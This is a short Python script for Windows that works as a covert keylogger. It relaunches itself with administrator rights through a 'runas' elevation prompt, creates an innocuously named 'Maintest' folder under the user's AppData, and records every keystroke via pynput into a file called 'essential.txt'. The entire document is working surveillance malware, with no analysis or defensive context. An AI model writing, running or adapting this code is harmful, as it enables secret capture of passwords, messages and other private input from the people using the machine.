from pynput.keyboard import Listener
import ctypes
import os
import sys 
if ctypes.windll.shell32.IsUserAnAdmin() == 0:
    script_path = os.path.abspath(__file__)
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, script_path, None, 1)
user = os.getlogin()
os.makedirs(f'C:\\Users\{user}\AppData\Roaming\Maintest')

def on_press(key):
    
    with open(f'C:\\Users\{user}\AppData\Roaming\Maintest\essential.txt', "a") as f:
        f.write(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
